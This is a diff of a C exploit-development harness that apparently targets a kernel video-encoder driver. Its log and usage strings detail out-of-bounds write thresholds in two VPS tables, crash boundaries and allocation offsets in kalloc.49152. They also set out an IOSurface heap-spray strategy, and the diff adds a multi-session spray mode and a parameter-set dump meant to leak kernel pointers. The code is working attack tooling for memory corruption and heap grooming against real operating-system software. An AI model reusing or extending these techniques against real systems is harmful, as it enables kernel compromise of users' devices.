@@ -715,17 +715,14 @@ int main(int argc, char *argv[]) {
             }
 
     } else if (strcmp(mode, "table2_heap") == 0) {
-        rlog("TABLE2_HEAP: Second VPS table heap overflow (PRIMARY EXPLOITATION PATH)\n");
+        rlog("TABLE2_HEAP: Second VPS table OOB + IOSurface spray test\n");
         rlog("Both VPS tables overflow simultaneously during MV-HEVC encoding.\n");
-        rlog("Table 2 at buffer+0x7DF4 overflows past buffer end (+0x9B10) at entry 466.\n");
-        rlog("Table 1 hits +0x5C70 pointer at entry 592 → crash.\n");
-        rlog("Safe window: 155-197 encodes (heap overflow without crash).\n\n");
-        rlog("Strategy:\n");
-        rlog("  1. Spray IOSurfaces in kalloc.49152 (same zone as HEVC buffer)\n");
-        rlog("  2. Create MV-HEVC encoder (allocates HEVC buffer)\n");
-        rlog("  3. Encode 170 frames (safe, well within window)\n");
-        rlog("  4. Table 2 entries 466+ write past buffer into adjacent IOSurface\n");
-        rlog("  5. Read back IOSurface properties for corruption detection\n\n");
+        rlog("NOTE: Buffer is 0x9B10 bytes in 0xC000 kalloc.49152 allocation.\n");
+        rlog("Table 2 OOB at 197 enc reaches +0xA2E4 — within allocation padding.\n");
+        rlog("Cross-allocation needs 1057 entries (~352 enc) — past crash limit.\n");
+        rlog("This test checks: a) if table 2 OOB corrupts driver state at +0x8DF4-0x9B10\n");
+        rlog("  b) if IOSurface spray lands in adjacent allocation (observable via readback)\n");
+        rlog("Table 1 hits +0x5C70 at entry 592 → crash at ~197 encodes.\n\n");
         if (phase1_verify() != 0) goto done;
 
         int t2_encodes = (argc > 2) ? atoi(argv[2]) : 170;
@@ -883,20 +880,22 @@ int main(int argc, char *argv[]) {
         rlog("  read_only  -- OOB read only (400 encodes)\n");
         rlog("  spray      -- IOSurface spray + cross-buffer (400 encodes)\n");
         rlog("  firmware <lid> <enc> -- Custom firmware param test\n");
-        rlog("  table2_heap [enc] [lid] -- TABLE 2 heap overflow (PRIMARY PATH)\n");
+        rlog("  table2_heap [enc] [lid] -- Table 2 OOB + IOSurface spray test\n");
         rlog("  safe_max [lid]   -- Maximum safe encodes (196) before crash\n");
         rlog("  simd_target -- Target entries #630-633 (56-byte SIMD overwrite)\n");
         rlog("  simd_safe [lid]  -- 210 encodes, stop BEFORE SIMD overwrite\n");
         rlog("  cumsum_predict   -- Measure NAL sizes, predict cumsum at entry 601\n");
+        rlog("  dual             -- Multi-session spray + cross-buffer + victim trigger\n");
+        rlog("  pset_dump [enc]  -- Dump raw parameter set bytes for kernel pointer leak\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
         rlog("  588 (~196 enc): Firmware param array start +0x5C34\n");
         rlog("  592 (~197 enc): +0x5C70 TARGET POINTER — CRASH BOUNDARY\n");
         rlog("  *** Entries 593+ UNREACHABLE from table 1 without crash ***\n");
-        rlog("\nKey entry thresholds (TABLE 2 — PRIMARY PATH):\n");
-        rlog("  256 (~86 enc):  First OOB write\n");
-        rlog("  466 (~155 enc): Past buffer end → HEAP OVERFLOW\n");
-        rlog("  Safe window: 155-197 encodes (heap overflow, no crash)\n");
+        rlog("\nKey entry thresholds (TABLE 2):\n");
+        rlog("  256 (~86 enc):  First OOB write (intra-buffer, 53 driver fields)\n");
+        rlog("  466 (~155 enc): Past buffer content (into alloc padding)\n");
+        rlog("  1057 (~352 enc): Past allocation end (UNREACHABLE, crash at 197)\n");
     }
 
 done:
